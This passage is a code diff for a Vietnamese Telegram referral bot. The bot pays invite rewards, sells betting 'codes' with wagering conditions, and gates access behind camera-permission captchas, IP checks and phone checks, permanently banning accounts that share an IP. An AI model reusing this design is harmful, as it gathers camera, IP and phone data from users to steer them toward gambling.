+                f"{E['CROSS']} Bạn đã <b>từ chối</b> quyền truy cập Camera.\n"
+                f"{E['WARN']} Xác minh bị hủy bỏ và bước Captcha chưa được hoàn thành.\n\n"
+                f"{E['REFRESH']} Vui lòng bấm lại nút bên dưới và đồng ý cấp quyền Camera khi được hỏi.",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove(),
+            )
+            await prompt_miniapp_captcha_verification(
+                message, user.id, is_retry=True
+            )
+            return
 
-            for inv_id, ref_id in rows:
-                if ref_id:
-                    referrer_affected.add(ref_id)
+        is_verify_payload = (
+            dtype in ("miniapp_captcha", "camera_snapshot", "cccam")
+            or "token" in data
+            or "passed" in data
+        )
 
-                cursor.execute(
-                    """
-                    SELECT id, amount FROM transactions
-                    WHERE type = 'Thưởng Mời Bạn'
-                      AND user_id = %s
-                      AND details LIKE %s
-                    """,
-                    (ref_id, f"%Mời {inv_id} %")
+        if is_verify_payload:
+            await handle_miniapp_captcha_data(message, context, user, data)
+            return
+
+        user_ip = data.get("ip")
+        if not user_ip:
+            await message.reply_text(
+                f"{E['CROSS']} Không lấy được thông tin IP. Vui lòng thử lại!",
+                parse_mode="HTML",
+            )
+            return
+
+        current_user_db = await db_query(
+            "SELECT ip_address FROM users WHERE user_id=%s",
+            (user.id,),
+            fetchone=True,
+        )
+        old_user_ip = current_user_db[0] if current_user_db else None
+
+        if old_user_ip != user_ip:
+            duplicate = await db_query(
+                "SELECT user_id FROM users WHERE ip_address=%s AND user_id!=%s AND skip_ip=0",
+                (user_ip, user.id),
+                fetchone=True,
+            )
+            if duplicate and user.id not in ADMIN_IDS:
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1, ip_address=%s WHERE user_id=%s",
+                    (user_ip, user.id),
+                    commit=True,
                 )
-                tx_rows = cursor.fetchall()
-                for tx_id_row, tx_amt in tx_rows:
-                    cursor.execute(
-                        "UPDATE users SET balance = balance - %s WHERE user_id = %s",
-                        (tx_amt, ref_id)
-                    )
-                    total_reward_removed += tx_amt
-                    cursor.execute("DELETE FROM transactions WHERE id = %s", (tx_id_row,))
-
-                cursor.execute(
-                    "UPDATE users SET referrer_id = NULL, ref_rewarded = 0 WHERE user_id = %s",
-                    (inv_id,)
+                user_withdraw_state.pop(user.id, None)
+                await message.reply_text(
+                    f"{E['GLOBE']} <b>PHÁT HIỆN TRÙNG IP!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"Địa chỉ IP <code>{user_ip}</code> đã được tài khoản khác sử dụng.\n"
+                    f"Tài khoản của bạn đã bị <b>khóa vĩnh viễn</b>!",
+                    parse_mode="HTML",
+                    reply_markup=ReplyKeyboardRemove(),
                 )
-                removed_count += 1
+                return
 
-            return removed_count, len(referrer_affected), total_reward_removed
+        await db_query(
+            "UPDATE users SET ip_address=%s WHERE user_id=%s",
+            (user_ip, user.id),
+            commit=True,
+        )
+        await message.reply_text(
+            f"{E['CHECK']} Xác minh IP thành công!\n\n"
+            f"{E['HOURGLASS']} Đang kiểm tra điều kiện tiếp theo...",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove(),
+        )
+        await proceed_next_verification(message, context, user)
 
-        removed_count, ref_count, reward_removed = await db_transaction(do_delete)
     except Exception as exc:
-        logger.exception("Lỗi /spl xóa lịch sử mời: %s", exc)
+        logger.exception("Lỗi khi xử lý dữ liệu từ MiniApp: %s", exc)
         try:
-            await query.edit_message_text(
-                f"{E['BAN']} <b>Có lỗi xảy ra khi xóa lịch sử mời bạn bè.</b>",
-                parse_mode="HTML"
+            await message.reply_text(
+                f"{E['CROSS']} Có lỗi xảy ra trong quá trình xác minh.",
+                parse_mode="HTML",
             )
         except Exception:
             pass
-        admin_spl_state.pop(query.from_user.id, None)
-        return
 
-    admin_spl_state.pop(query.from_user.id, None)
 
+async def finalize_user_registration(user, context: ContextTypes.DEFAULT_TYPE):
     try:
-        await query.edit_message_text(
-            f"{E['CHECK_ANIMATED']} <b>ĐÃ XÓA LỊCH SỬ MỜI BẠN BÈ THÀNH CÔNG!</b>\n"
-            f"━━━━━━━━━━━━━━━━━━\n"
-            f"{E['CALENDAR']} <b>Từ ngày:</b> <code>{date_iso}</code>\n"
-            f"{E['EYES']} <b>Số người được mời đã gỡ:</b> <code>{removed_count}</code>\n"
-            f"{E['COOL']} <b>Số referrer bị ảnh hưởng:</b> <code>{ref_count}</code>\n"
-            f"{E['MONEY']} <b>Tổng tiền thưởng đã thu hồi:</b> <code>{reward_removed:,}đ</code>",
-            parse_mode="HTML"
+        chat_full = await context.bot.get_chat(user.id)
+        bio = chat_full.bio or ""
+        if BIO_FLAG in bio.lower():
+            db_user_info = await db_query(
+                "SELECT referrer_id FROM users WHERE user_id=%s",
+                (user.id,),
+                fetchone=True,
+            )
+            referrer_id = db_user_info[0] if db_user_info else None
+
+            await db_query(
+                "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                (user.id,),
+                commit=True,
+            )
+
+            if referrer_id:
+                await db_query(
+                    "UPDATE users SET is_banned=1, is_withdraw_banned=1 WHERE user_id=%s",
+                    (referrer_id,),
+                    commit=True,
+                )
+                try:
+                    await context.bot.send_message(
+                        chat_id=referrer_id,
+                        text="🚨 <b>TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA VĨNH VIỄN!</b>\n━━━━━━━━━━━━━━━━━━\nBuff ref khoá vĩnh viễn, cần hỗ trợ nhắn qua @dgfrutil",
+                        parse_mode="HTML",
+                    )
+                except Exception:
+                    pass
+
+            await context.bot.send_message(
+                chat_id=user.id,
+                text=f"🚨 <b>TÀI KHOẢN CỦA BẠN ĐÃ BỊ KHÓA VĨNH VIỄN!</b>\n━━━━━━━━━━━━━━━━━━\nLý do: Phát hiện tiểu sử (`bio`) chứa `@Lienminhvietnam`.",
+                parse_mode="HTML",
+                reply_markup=ReplyKeyboardRemove(),
+            )
+            return
+    except Exception as exc:
+        logger.warning(
+            f"Lỗi kiểm tra bio khi đăng ký cho user {user.id}: {exc}"
         )
-    except Exception:
-        pass
 
-async def spl_process_text(update: Update, context: ContextTypes.DEFAULT_TYPE) -> bool:
-    message = update.effective_message
-    user = update.effective_user
-    if not message or not user:
-        return False
-
-    state = admin_spl_state.get(user.id)
-    if not state:
-        return False
-
-    if state.get("step") != "WAITING_DATE":
-        return False
-
-    raw = (message.text or "").strip()
-    date_iso = parse_date_input(raw)
-    if not date_iso:
-        await message.reply_text(
-            f"{E['BAN']} <b>Ngày không hợp lệ!</b>\n"
-            f"Vui lòng nhập theo định dạng:\n"
-            f"• <code>01-10-2026</code> (dd-mm-yyyy)\n"
-            f"• <code>2026-10-01</code> (yyyy-mm-dd)\n"
-            f"• <code>01/10/2026</code> (dd/mm/yyyy)\n\n"
-            f"Hoặc bấm <b>❌ HỦY THAO TÁC</b> để thoát.",
-            parse_mode="HTML"
-        )
-        return True
-
-    try:
-        res = await db_query(
-            """
-            SELECT COUNT(*)
-            FROM users
-            WHERE referrer_id IS NOT NULL
-              AND referrer_id <> 0
-              AND joined_at IS NOT NULL
-              AND joined_at >= %s
-            """,
-            (date_iso + " 00:00:00",),
-            fetchone=True
-        )
-        count_preview = res[0] if res else 0
-    except Exception:
-        count_preview = 0
-
-    admin_spl_state[user.id] = {"step": "WAITING_CONFIRM", "date": date_iso}
-
-    kb = InlineKeyboardMarkup([
-        [InlineKeyboardButton("✅ XÁC NHẬN XÓA", callback_data=f"spl_confirm_{date_iso}")],
-        [InlineKeyboardButton("❌ HỦY THAO TÁC", callback_data="spl_cancel")]
-    ])
-
-    await message.reply_text(
-        f"{E['ALERT1']} <b>XÁC NHẬN LẦN CUỐI</b>\n"
-        f"━━━━━━━━━━━━━━━━━━\n"
-        f"{E['CALENDAR']} <b>Ngày bắt đầu xóa:</b> <code>{date_iso}</code>\n"
-        f"{E['EYES']} <b>Số người được mời sẽ bị gỡ:</b> <code>{count_preview}</code>\n\n"
-        f"{E['WARN1']} Tiền thưởng mời bạn liên quan cũng sẽ bị <b>thu hồi</b>.\n"
-        f"{E['WARN2']} Hành động này <b>KHÔNG THỂ HOÀN TÁC</b>!\n\n"
-        f"{E['ARROW_DOWN']} Bấm <b>✅ XÁC NHẬN XÓA</b> để tiếp tục hoặc <b>❌ HỦY</b> để thoát.",
-        reply_markup=kb,
-        parse_mode="HTML"
+    db_user = await db_query(
+        "SELECT referrer_id FROM users WHERE user_id=%s",
+        (user.id,),
+        fetchone=True,
     )
-    return True
+    if db_user and db_user[0]:
+        ref_id = db_user[0]
+        try:
 
-# ============================================================
-# MENU HANDLER
-# ============================================================
+            def reward_referrer(cursor):
+                detail_exact = f"Mời {user.id}"
+                cursor.execute(
+                    "SELECT id FROM transactions WHERE user_id=%s AND type='Thưởng Mời Bạn' AND details=%s",
+                    (ref_id, detail_exact),
+                )
+                if cursor.fetchone():
+                    return False
+                cursor.execute(
+                    "INSERT INTO transactions (user_id, type, amount, status, created_at, details) VALUES (%s, %s, %s, %s, %s, %s) ON CONFLICT DO NOTHING",
+                    (
+                        ref_id,
+                        "Thưởng Mời Bạn",
+                        REFERRAL_REWARD,
+                        "Thành công",
+                        get_now_str(),
+                        detail_exact,
+                    ),
+                )
+                if cursor.rowcount == 0:
+                    return False
+                cursor.execute(
+                    "UPDATE users SET balance = balance + %s WHERE user_id=%s",
+                    (REFERRAL_REWARD, ref_id),
+                )
+                return True
 
-def clean_menu_text(raw_text: str) -> str:
-    if not raw_text:
-        return ""
-    text_cleaned = re.sub(r'[^\w\s]', '', raw_text).strip()
-    return text_cleaned
+            rewarded = await db_transaction(reward_referrer)
+            if rewarded:
+                username_str = (
+                    f"@{user.username}" if user.username else str(user.id)
+                )
+                try:
+                    await context.bot.send_message(
+                        chat_id=ref_id,
+                        text=(
+                            f"{E['LOVE_FACE']} <b>THƯỞNG MỜI BẠN BÈ!</b>\n"
+                            f"{E['MONEY_FLY']} Bạn nhận được <b>+{REFERRAL_REWARD:,}đ</b>\n"
+                            f"{E['RIGHT']} Từ người dùng: <b>{username_str}</b>"
+                        ),
+                        parse_mode="HTML",
+                    )
+                except Exception as exc:
+                    logger.warning("Không gửi được thông báo referrer: %s", exc)
+        except Exception as exc:
+            logger.exception("Lỗi transaction thưởng giới thiệu: %s", exc)
+
+    await context.bot.send_message(
+        chat_id=user.id,
+        text=(
+            f"{E['CHECK2']} <b>XÁC MINH THÀNH CÔNG!</b>\n"
+            f"{E['TOP']} <b>Chào mừng bạn đã gia nhập hệ thống Bot VIP!</b>"
+        ),
+        reply_markup=get_main_keyboard(user.id),
+        parse_mode="HTML",
+    )
+
+
+def build_buy_success_text(code_val: str) -> str:
+    return (
+        f"{E['LOVE_FACE']} <b>MUA CODE THÀNH CÔNG!</b> {E['FIRE']}\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E['MONEY']} Số tiền mua: <b>{CODE_PRICE:,}đ</b>\n"
+        f"{E['CARD']} Mã Code: <code>{code_val}</code>\n"
+        f"{E['STAR']} Giá trị Code: <b>7.777-15.888</b>\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E['SHIELD']} <b>📌 QUY ĐỊNH SỬ DỤNG & ĐIỀU KIỆN RÚT TIỀN</b>\n\n"
+        f"1️⃣ {E['TARGET']} <b>Điều kiện cược:</b> Hoàn thành đủ 1 vòng cược theo giá trị code để đáp ứng điều kiện rút tiền.\n\n"
+        f"2️⃣ {E['BANK']} <b>Tài khoản chưa có lịch sử nạp trên 50K:</b> Cần nạp tối thiểu 50.000đ và hoàn thành mức cược 50.000đ (X1 vòng cược) trước khi thực hiện rút tiền.\n\n"
+        f"3️⃣ {E['CHECK2']} <b>Tài khoản đã có lịch sử nạp trên 50K:</b> Được rút tiền từ code sau khi hoàn thành các điều kiện cược theo quy định.\n\n"
+        f"{E['NUM_4']} {E['EXCL']} <b>Giới hạn nhập code:</b> Không cộng dồn code và chỉ được nhập tối đa 5 code từ bot mỗi ngày.\n\n"
+        f"{E['NUM_5']} {E['ROCKET']} <b>Code từ sự kiện khác:</b> Không thuộc giới hạn 5 code/ngày của bot; việc sử dụng vẫn tuân theo thể lệ riêng của từng sự kiện.\n\n"
+        f"━━━━━━━━━━━━━━━━━━━━\n"
+        f"{E['WARN']} <b>LƯU Ý QUAN TRỌNG</b> {E['WARN']}\n"
+        f"{E['INFO']} Vui lòng đọc kỹ các điều kiện trước khi sử dụng code để nắm rõ quy định và đảm bảo quyền lợi của mình.\n\n"
+        f"{E['HEART']} Chúc anh em trải nghiệm vui vẻ và may mắn! {E['CLOVER']}{E['FIRE']}"
+    )
+
 
 async def menu_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
     message = update.effective_message
     user = update.effective_user
-    if not message or not user or update.effective_chat.type != "private":
+    if not message or not user:
+        return
+    if update.effective_chat.type != "private":
         return
 
-    await ensure_user_exists(update)
-    db_user = await get_fresh_user(user.id)
+    if user.id in pending_captcha_users:
+        user_input = (message.text or "").strip()
+        if await handle_captcha_input(update, context, user.id, user_input):
+            return
+
+    db_user = await ensure_user_exists(update)
     user_withdraw_state.pop(user.id, None)
-
-    if user.id in ADMIN_IDS and user.id in admin_checkdl_state:
-        target_id = admin_checkdl_state.pop(user.id)
-        date_str = message.text.strip()
-
-        target_user = await db_query("SELECT user_id, username FROM users WHERE user_id=%s", (target_id,), fetchone=True)
-        if not target_user:
-            await message.reply_text(f"❌ Không tìm thấy user ID <code>{target_id}</code> trong hệ thống.", parse_mode="HTML")
-            return
-
-        all_invited = await db_query("SELECT user_id, username, is_captcha_passed, is_phone_verified, joined_at FROM users WHERE referrer_id=%s ORDER BY joined_at DESC", (target_id,), fetchall=True)
-
-        filtered_invited = []
-        for inv in all_invited:
-            joined_full = inv[4] or ""
-            if date_str in joined_full or joined_full >= date_str:
-                filtered_invited.append(inv)
-
-        referrer_uname = f"@{target_user[1]}" if target_user[1] else f"<code>{target_id}</code>"
-
-        if not filtered_invited:
-            await message.reply_text(f"{E['ALERT1']} Người giới thiệu <b>{referrer_uname}</b> (ID: <code>{target_id}</code>) không mời được ai từ ngày <b>{date_str}</b> trở đi.", parse_mode="HTML")
-            return
-
-        msg = f"{E['CHART']} <b>CHI TIẾT NGƯỜI GIỚI THIỆU & ĐƯỢC GIỚI THIỆU</b>\n━━━━━━━━━━━━━━━━━━\n"
-        msg += f"👑 <b>Người giới thiệu:</b> {referrer_uname} (ID: <code>{target_id}</code>)\n"
-        msg += f"🗓 <b>Lọc từ ngày:</b> <code>{date_str}</code>\n"
-        msg += f"👥 <b>Tổng số lượng mời được:</b> <b>{len(filtered_invited)}</b> người\n\n"
-
-        for inv_id, inv_username, is_captcha, is_phone, joined_at in filtered_invited:
-            inv_uname = f"@{inv_username}" if inv_username else f"<code>{inv_id}</code>"
-
-            try:
-                missing_ch = await get_missing_channels(context.bot, inv_id)
-            except Exception:
-                missing_ch = REQUIRED_CHECK_CHANNELS.copy()
-
-            msg += f"👤 <b>Người được giới thiệu:</b> {inv_uname} (<code>{inv_id}</code>)\n"
-            msg += f"🗓 <b>Thời gian tham gia:</b> <code>{joined_at or 'N/A'}</code>\n"
-            msg += f"• <b>SĐT:</b> {'✅ Đã xác minh' if is_phone else '❌ Chưa xác minh'}\n"
-            msg += f"• <b>Captcha:</b> {'✅ Đã giải' if is_captcha else '❌ Chưa giải'}\n"
-
-            if not missing_ch:
-                msg += f"• <b>Trạng thái nhóm:</b> Đã tham gia đầy đủ các nhóm bắt buộc\n"
-            else:
-                msg += f"• <b>Chưa gia nhập các nhóm ({len(missing_ch)}):</b> <i>{', '.join(missing_ch)}</i>\n"
-
-            msg += "----------------------------------\n"
-
-            if len(msg) > 3500:
-                await message.reply_text(msg, parse_mode="HTML")
-                msg = ""
-            await asyncio.sleep(0.05)
-
-        if msg.strip():
-            await message.reply_text(msg, parse_mode="HTML")
-        return
-
     if await is_maintenance() and user.id not in ADMIN_IDS:
-        await message.reply_text(f"{E['STOP']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n{E['GEAR']} Vui lòng quay lại sau!", parse_mode="HTML")
+        await message.reply_text(
+            f"{E['BANDAGE']} <b>HỆ THỐNG ĐANG BẢO TRÌ</b>\n"
+            f"Vui lòng quay lại sau!",
+            parse_mode="HTML",
+        )
+        return
+    if not db_user or db_user[3] == 1:
+        ip_val = (
+            db_user[7]
+            if (db_user and len(db_user) > 7 and db_user[7])
+            else "Không xác định"
+        )
+        await message.reply_text(
+            f"{E['GLOBE']} <b>PHÁT HIỆN TRÙNG IP!</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"Địa chỉ IP <code>{ip_val}</code> đã được tài khoản khác sử dụng.\n"
+            f"Tài khoản của bạn đã bị <b>khóa vĩnh viễn</b> do trùng IP và full thông tin!",
+            parse_mode="HTML",
+            reply_markup=ReplyKeyboardRemove(),
+        )
         return
 
-    if not db_user or db_user[10] == 1:
-        await message.reply_text(f"{E['BAN']} <b>Tài khoản của bạn đã bị cấm khỏi hệ thống!</b>", parse_mode="HTML")
-        return
-
-    if user.id not in ADMIN_IDS:
-        if not await process_user_verification_flow(update, context, user.id):
+    if await get_verify_setting("verify_phone"):
+        if not await check_phone_verified(user.id) and user.id not in ADMIN_IDS:
+            await prompt_phone_verification(message, user.id)
             return
 
-    raw_text = (message.text or "").strip()
-    clean_text = clean_menu_text(raw_text).lower()
+    if await get_verify_setting("verify_cccam"):
+        if not await check_cccam_verified(user.id) and user.id not in ADMIN_IDS:
+            await prompt_miniapp_captcha_verification(message, user.id)
+            return
 
-    if clean_text in ["tai khoan", "tài khoản"] or "tài khoản" in raw_text.lower():
-        balance = db_user[2]
-        res = await db_query("SELECT COUNT(*) FROM users WHERE referrer_id=%s AND ref_rewarded=1", (user.id,), fetchone=True)
-        invited_count = res[0] if res else 0
-        res_withdraw = await db_query("SELECT COALESCE(SUM(amount), 0)::BIGINT FROM transactions WHERE user_id=%s AND type='Rút Tiền' AND status='Thành công'", (user.id,), fetchone=True)
-        total_withdraw = res_withdraw[0] if res_withdraw else 0
-        msg = (
-            f"{E['CROWN']} <b>THÔNG TIN TÀI KHOẢN VIP</b>\n━━━━━━━━━━━━━━━━━━\n"
-            f"{E['EYES']} <b>ID:</b> <code>{user.id}</code>\n"
-            f"{E['CHECK_ANIMATED']} <b>Xác minh:</b> <code>Đã hoàn tất</code>\n"
-            f"{E['UP']} <b>Số dư:</b> <code>{balance:,}đ</code>\n"
-            f"{E['COOL']} <b>Đã mời hợp lệ:</b> <code>{invited_count}</code> người\n"
-            f"{E['DOWN']} <b>Đã rút:</b> <code>{total_withdraw:,}đ</code>"
+    if await get_verify_setting("verify_miniapp_captcha") or await get_verify_setting(
+        "verify_camera"
+    ):
+        if (
+            not await check_miniapp_captcha_verified(user.id)
+            or not await check_camera_verified(user.id)
+        ) and user.id not in ADMIN_IDS:
+            await prompt_miniapp_captcha_verification(message, user.id)
+            return
+
+    if await get_verify_setting("verify_ip"):
+        if not await check_ip_verified(user.id) and user.id not in ADMIN_IDS:
+            await prompt_ip_verification(message, user.id)
+            return
+
+    if await get_verify_setting("verify_captcha"):
+        if not await check_captcha_verified(user.id) and user.id not in ADMIN_IDS:
+            if user.id not in pending_captcha_users:
+                await send_captcha_challenge(message, context, user.id)
+                return
+
+    if await get_verify_setting("verify_channel"):
+        if user.id not in ADMIN_IDS:
+            missing_channels = await get_missing_channels(context.bot, user.id)
+            if missing_channels:
+                buttons = build_channel_buttons(missing_channels)
+                missing_text = "\n".join([
+                    f"• <b>{ch}</b>" for ch in missing_channels
+                ])
+                await message.reply_text(
+                    f"{E['BANDAGE']} <b>BẠN CHƯA THAM GIA ĐỦ CÁC KÊNH/NHÓM!</b>\n"
+                    f"━━━━━━━━━━━━━━━━━━\n"
+                    f"{E['WARN']} Bạn còn thiếu <b>{len(missing_channels)}</b> kênh/nhóm sau:\n\n"
+                    f"{missing_text}\n\n"
+                    f"{E['RIGHT']} Vui lòng tham gia đầy đủ rồi bấm nút bên dưới để tiếp tục!",
+                    reply_markup=InlineKeyboardMarkup(buttons),
+                    parse_mode="HTML",
+                )
+                return
+
+    text = (message.text or "").strip()
+
+    if user.id in ADMIN_IDS and is_admin_kb_text(text):
+        if await admin_keyboard_handler(update, context, text):
+            return
+
+    if text in ["Menu", "⚙️ Menu"]:
+        if user.id not in ADMIN_IDS:
+            return
+        await show_admin_page(message, user.id, 0)
+        return
+
+    if text in ["Tài Khoản", "👤 Tài Khoản"]:
+        balance = db_user[1]
+        phone_str = (
+            db_user[6] if len(db_user) > 6 and db_user[6] else "Chưa xác minh"
         )
-        await message.reply_text(msg, parse_mode="HTML", reply_markup=get_main_keyboard())
+        ip_str = (
+            db_user[7] if len(db_user) > 7 and db_user[7] else "Chưa xác minh"
+        )
+        invited_count = await get_valid_referrals_count(user.id)
+        res_withdraw = await db_query(
+            "SELECT COALESCE(SUM(amount), 0) FROM transactions WHERE user_id=%s and type LIKE 'Mua Code%%' AND status='Thành công'",
+            (user.id,),
+            fetchone=True,
+        )
+        total_withdraw = res_withdraw[0]
+        msg = (
+            f"{E['LOVE_FACE']} <b>THÔNG TIN TÀI KHOẢN VIP</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['RIGHT']} <b>ID:</b> <code>{user.id}</code>\n"
+            f"{E['PHONE']} <b>SĐT:</b> <code>{phone_str}</code>\n"
+            f"{E['GLOBE']} <b>IP:</b> <code>{ip_str}</code>\n"
+            f"{E['MONEY']} <b>Số dư:</b> <code>{balance:,}đ</code>\n"
+            f"{E['ROCKET']} <b>Đã mời thành công:</b> <code>{invited_count}</code> người\n"
+            f"{E['CARD']} <b>Đã dùng mua Code:</b> <code>{total_withdraw:,}đ</code>"
+        )
+        await message.reply_text(msg, parse_mode="HTML")
 
-    elif clean_text in ["moi ban be", "mời bạn bè"] or "mời bạn" in raw_text.lower():
+    elif text in ["Mời Bạn Bè", "🎁 Mời Bạn Bè"]:
         try:
             bot_info = await context.bot.get_me()
             bot_username = bot_info.username
         except Exception as exc:
             logger.exception("Không lấy được username bot: %s", exc)
-            await message.reply_text("❌ Không lấy được thông tin bot. Vui lòng thử lại.")
+            await message.reply_text(
+                f"{E['CROSS']} Không lấy được thông tin bot. Vui lòng thử lại.",
+                parse_mode="HTML",
+            )
             return
         if not bot_username:
-            await message.reply_text("❌ Bot chưa có username, không thể tạo link mời.")
+            await message.reply_text(
+                f"{E['CROSS']} Bot chưa có username, không thể tạo link mời.",
+                parse_mode="HTML",
+            )
             return
         ref_link = f"https://t.me/{bot_username}?start={user.id}"
         msg = (
-            f"{E['FREE']} <b>CHƯƠNG TRÌNH MỜI BẠN BÈ</b>\n━━━━━━━━━━━━━━━━━━\n"
-            f"{E['CLIP']} <b>Link giới thiệu của bạn:</b>\n<code>{ref_link}</code>\n\n"
-            f"{E['CALENDAR']} <b>Thể lệ nhận thưởng:</b>\n"
-            f"• {E['LIGHTNING']} Nhận ngẫu nhiên từ <b>1,000đ - 1,500đ</b> / lượt mời thành công.\n"
-            f"• {E['CLIP']} Bạn bè phải tham gia đủ kênh, giải CAPTCHA & xác minh SĐT.\n"
-            f"• {E['DOWN']} Min rút: <b>{MIN_WITHDRAW:,}đ</b>\n"
-            f"• {E['TOP']} Max rút: <b>{MAX_WITHDRAW:,}đ</b>"
+            f"{E['LOVE_FACE']} <b>CHƯƠNG TRÌNH MỜI BẠN BÈ</b>\n"
+            f"━━━━━━━━━━━━━━━━━━\n"
+            f"{E['RIGHT']} <b>Link giới thiệu của bạn:</b>\n"
+            f"<code>{ref_link}</code>\n\n"
+            f"{E['INFO']} <b>Thể lệ nhận thưởng:</b>\n"
+            f"• {E['MONEY_FLY']} Nhận ngay: <b>+{REFERRAL_REWARD:,}đ</b> / lượt mời thành công.\n"
+            f"• {E['RIGHT']} Bạn bè phải hoàn tất các bước xác minh theo yêu cầu hệ thống.\n"
+            f"• {E['TOP']} Giá mua Code: <b>{CODE_PRICE:,}đ</b>"
         )
-        await message.reply_text(msg, parse_mode="HTML", reply_markup=get_main_keyboard())
+        await message.reply_text(msg, parse_mode="HTML")
 
-    elif clean_text == "top" or "top" in raw_text.lower():
+    elif text in ["Top", "🔝 Top"]:
         top_users = await db_query(
             """
-            SELECT u.user_id, u.username, COUNT(r.user_id) AS ref_count
-            FROM users u
-            LEFT JOIN users r ON r.referrer_id = u.user_id AND r.ref_rewarded = 1
-            WHERE u.is_banned = 0
-            GROUP BY u.user_id, u.username
-            HAVING COUNT(r.user_id) > 0
+            SELECT t.user_id, u.username, COUNT(t.id) AS ref_count
+            FROM transactions t
+            JOIN users u ON u.user_id = t.user_id
+            WHERE t.type = 'Thưởng Mời Bạn' AND t.status = 'Thành công' AND u.is_banned = 0
+            GROUP BY t.user_id, u.username
             ORDER BY ref_count DESC
             LIMIT 10
             """,
-            fetchall=True
+            fetchall=True,
         )
         if not top_users:
-            await message.reply_text(f"{E['CHART']} <b>Hiện chưa có ai trong bảng xếp hạng Top tuyển ref!</b>", parse_mode="HTML", reply_markup=get_main_keyboard())
-            return
-
-        msg = f"{E['TOP']} <b>TOP 10 THÀNH VIÊN TUYỂN REF NHIỀU NHẤT</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        for idx, (top_id, top_username, ref_count) in enumerate(top_users, start=1):
-            name_str = f"@{top_username}" if top_username else f"User {top_id}"
-            icon = E['MEDAL1'] if idx == 1 else (E['MEDAL2'] if idx == 2 else (E['MEDAL3'] if idx == 3 else E['CHECK_ANIMATED']))
-            msg += f"{icon} <b>Top {idx}:</b> {name_str} — <code>{ref_count:,}</code> bạn bè hợp lệ\n"
-
-        await message.reply_text(msg, parse_mode="HTML", reply_markup=get_main_keyboard())
-
-    elif clean_text in ["nhom ho tro", "nhóm hỗ trợ"] or "hỗ trợ" in raw_text.lower():
-        await message.reply_text(
-            f"{E['SPEAKER']} <b>NHÓM HỖ TRỢ CHÍNH THỨC:</b>\n👉 {SUPPORT_GROUP}\nadmin hỗ trợ @dgfrutil",
-            parse_mode="HTML",
-            reply_markup=get_main_keyboard()
-        )
-
-    elif clean_text in ["lich su", "lich su giao dịch", "lịch sử giao dịch", "lịch sử"] or "lịch sử" in raw_text.lower():
-        txs = await db_query("SELECT type, amount, status, created_at FROM transactions WHERE user_id=%s ORDER BY id DESC LIMIT 10", (user.id,), fetchall=True)
-        if not txs:
-            await message.reply_text(f"{E['CALENDAR']} <b>Bạn chưa có giao dịch nào.</b>", parse_mode="HTML", reply_markup=get_main_keyboard())
-            return
-        msg = f"{E['CHART']} <b>LỊCH SỬ GIAO DỊCH GẦN ĐÂY</b>\n━━━━━━━━━━━━━━━━━━\n\n"
-        for tx_type, amount, status, created_at in txs:
-            icon = E['THUMB'] if status == "Thành công" else (E['BAN'] if status == "Từ chối" else E['CALENDAR'])
-            msg += f"{icon} <b>{tx_type}</b>: <code>{amount:,}đ</code>\n{E['CHART']} Trạng thái: <b>{status}</b>\n{E['CALENDAR']} Thời gian: <code>{created_at}</code>\n----------------------------------\n"
-        await message.reply_text(msg, parse_mode="HTML", reply_markup=get_main_keyboard())
-
-    elif clean_text in ["rut tien", "rút tiền"] or "rút tiền" in raw_text.lower():
-        if not await get_setting("enable_withdraw", "1"):
-            await message.reply_text(f"{E['STOP']} <b>TÍNH NĂNG RÚT TIỀN ĐANG TẠM ĐÓNG!</b>\n{E['GEAR']} Hệ thống đang tạm ngưng chức năng rút tiền. Vui lòng quay lại sau!", parse_mode="HTML", reply_markup=get_main_keyboard())
-            return
-
-        if db_user[11] == 1:
-            await message.reply_text(f"{E['BAN']} <b>Tài khoản của bạn đã bị CẤM RÚT TIỀN!</b>", parse_mode="HTML", reply_markup=get_main_keyboard())
-            return
-        bank_info = db_user[3]
-        if not bank_info:
-            await message.reply_text(f"{E['ALERT1']} <b>BẠN CHƯA LIÊN KẾT NGÂN HÀNG</b>\n{E['ARROW_DOWN']} Vui lòng gửi lệnh liên kết theo cú pháp:\n<code>/lk STK Tên_Ngân_Hàng Tên_Chủ_Thẻ</code>\n\n{E['LIGHTNING']} <b>Ví dụ:</b> <code>/lk 1068030300 VCB NGUYEN CA NGU</code>", parse_mode="HTML", reply_markup=get_main_keyboard())
-        else:
-            user_withdraw_state[user.id] = "WAITING_AMOUNT"
-            cancel_btn = InlineKeyboardMarkup([[InlineKeyboardButton("❌ HỦY THAO TÁC", callback_data="cancel_withdraw")]])
             await message.reply_text(
-                f"{E['TOP']} <b>LỆNH RÚT TIỀN VIP</b>\n━━━━━━━━━━━━━━━━━━\n"
-                f"{E['LOCK']} <b>Tài khoản nhận:</b> <code>{bank_info}</code>\n"
-                f"{E['UP']} <b>Số dư hiện tại:</b> <code>{db_user[2]:,}đ</code>\n"
-                f"{E['CLIP']} <b>Hạn mức:</b> <code>{MIN_WITHDRAW:,}đ</code> - <code>{MAX_WITHDRAW:,}đ</code>\n\n"
-                f"{E['ARROW_DOWN']} <b>Vui lòng nhập số tiền bạn muốn rút:</b>\n"
-                f"<i>(Nhập 'hủy' hoặc bấm nút bên dưới để thoát)</i>",
-                reply_markup=cancel_btn,
+                f"{E['BANDAGE']} <b>Hiện chưa có ai trong bảng xếp hạng Top tuyển ref!</b>",
                 parse_mode="HTML",
             )
+            return
+        msg = f"{E['TOP']} <b>TOP 10 THÀNH VIÊN TUYỂN REF NHIỀU NHẤT</b>\n━━━━━━━━━━━━━━━━━━\n\n"
+        medals = {
+            1: E["GOLD_MEDAL"],
+            2: E["SILVER_MEDAL"],
+            3: E["BRONZE_MEDAL"],
+        }
+        for idx, (top_id, top_username, ref_count) in enumerate(
+            top_users, start=1
+        ):
+            name_str = f"@{top_username}" if top_username else f"User {top_id}"
